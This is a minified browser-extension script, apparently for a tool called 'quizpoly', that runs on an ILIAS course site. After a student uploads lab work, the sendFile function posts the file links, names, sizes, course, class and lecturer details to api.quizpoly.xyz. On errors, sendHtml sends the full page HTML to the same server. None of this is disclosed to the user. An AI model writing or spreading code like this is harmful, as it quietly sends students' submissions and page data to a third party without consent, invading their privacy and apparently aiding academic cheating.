const apiUrl = "https://api.quizpoly.xyz",
    breadcrumb = document.querySelector(".ilTableHeaderTitle > a"),
    lab = breadcrumb && breadcrumb.innerText.split("-")[1].trim(),
    urlParsed = new URL(window.location.href),
    fileId = "file-" + urlParsed.searchParams.get("ref_id") + urlParsed.searchParams.get("ass_id"),
    alertEl = document.querySelector(".alert-success");
if (
    alertEl &&
    ("Success Message\nĐã tải lên file" == alertEl.innerText || "Success Message\nFile uploaded" == alertEl.innerText)
) {
    const a = Array.from(document.querySelectorAll("table tbody > tr")),
        b = a.map((e) => e.querySelector("td:last-child>a").getAttribute("href")).join("\n");
    sendFile(b);
}
function getSubject() {
    let e = document.querySelector(".breadcrumb>.crumb:nth-of-type(6)");
    return (
        (subjectName = e.innerText.trim()),
        (["2d, 3d animation - dựng phim", "2d", "cơ khí", "tự động hoá", "thiết kế cơ bản"].includes(
            subjectName.toLowerCase()
        ) ||
            subjectName.toLowerCase().startsWith("ngành")) &&
            ((e = document.querySelector(".breadcrumb>.crumb:nth-of-type(7)")), (subjectName = e.innerText.trim())),
        (classCode = e.nextElementSibling.innerText.trim()),
        { subjectName: subjectName, classCode: classCode }
    );
}
async function getLecturers() {
    let e = "";
    var t = /^[A-Z]{2,3}[0-9]{3,5}([_|\.][0-9]{1,3})?$/;
    let r = document.querySelector(".breadcrumb>span:nth-last-child(2)>a");
    if (!r) return "";
    if (
        null === r.innerText.match(t) &&
        ((r = document.querySelector(".breadcrumb>span:nth-last-child(3)>a")), null === r.innerText.match(t))
    )
        return "";
    (t = r.getAttribute("href")),
        (t = /ref_id=([^&]+)/.exec(t)[1]),
        (t = `${window.location.origin}/ilias.php?ref_id=${t}&cmdClass=ilusersgallerygui&cmd=view&cmdNode=4t:zw:102:6&baseClass=ilrepositorygui`);
    let n = await fetch(t);
    500 <= n.status && (n = await fetch(t));
    const a = await n.text(),
        i = parseHTML(a),
        l = i.querySelector(".ilHeaderDesc");
    if ((l && (e = l.innerText.trim()), !e)) {
        const o = i.querySelectorAll(".il-card dl > dd"),
            u = [];
        for (var [s, c] of o.entries()) {
            const m = c.innerText;
            if ("Support Contact" != m) {
                if (
                    (void 0 === m && sendHtml("get file lecturers member undefined", a),
                    void 0 !== m && m.replace(/[^0-9]/g, "").length < 5)
                )
                    u.push(m);
                else if (0 != s) break;
            } else u[s - 1] = "-" + u[s - 1];
        }
        e = u.length ? u.join(" - ") : "";
    }
    return (
        e || sendHtml(`lecturers empty - ${n.status}`, a.includes("Failure Message") ? "Failure Message" : a),
        console.debug(e),
        e
    );
}
function getFileInfo() {
    return new Promise((r, e) => {
        chrome.storage.local.get(fileId, (e) => {
            const t = e[fileId];
            t.sort((e, t) => e.name.localeCompare(t.name)),
                (fileName = t.map(({ name: e }) => e).join("\n")),
                (fileSize = t.map(({ size: e }) => humanFileSize(e)).join(",")),
                r({ fileName: fileName, fileSize: fileSize }),
                chrome.storage.local.remove(fileId);
        });
    });
}
async function sendFile(e) {
    var t = await getLecturers(),
        { subjectName: r, classCode: n } = getSubject(),
        { server: a, term: i } = getServerTerm(),
        { fileName: l, fileSize: s } = await getFileInfo(),
        i = { fileUrl: e, fileName: l, subjectName: r, size: s, class: t ? `${n} - ${t}` : n, lab: lab, server: a, term: i };
    fetch(apiUrl + "/quizpoly/lab", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        referrerPolicy: "origin",
        body: JSON.stringify(i),
    })
        .then((e) => e.json())
        .then((e) => console.debug(e));
}
function getServerTerm() {
    try {
        const e = document.querySelector(".crumb:nth-child(3) > a").innerText,
            t = document.querySelector(".crumb:nth-child(2) > a").innerText;
        return (
            (server = t
                .split(" ")
                .map((e) => e.charAt(0))
                .join("")),
            (term = e.replace("HK_", "").replace("_", " ")),
            { server: server, term: term }
        );
    } catch (e) {
        sendHtml(`Upload file get server term error: ${e.message}`);
    }
}
async function sendHtml(e, t) {
    try {
        (t = t || document.body.innerHTML.replace(/\n/g, "").replace(/\t/g, "")),
            fetch(apiUrl + "/quizpoly/html", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ note: e, html: t }),
            });
    } catch (e) {
        console.debug(e);
    }
}
function humanFileSize(e, t = 1) {
    if (Math.abs(e) < 1e3) return e + " B";
    var r = ["kB", "MB", "GB", "TB", "PB", "EB", "ZB", "YB"];
    let n = -1;
    for (var a = 10 ** t; (e /= 1e3), ++n, 1e3 <= Math.round(Math.abs(e) * a) / a && n < r.length - 1; );
    return e.toFixed(t) + " " + r[n];
}
function parseHTML(e) {
    return new DOMParser().parseFromString(e, "text/html");
}
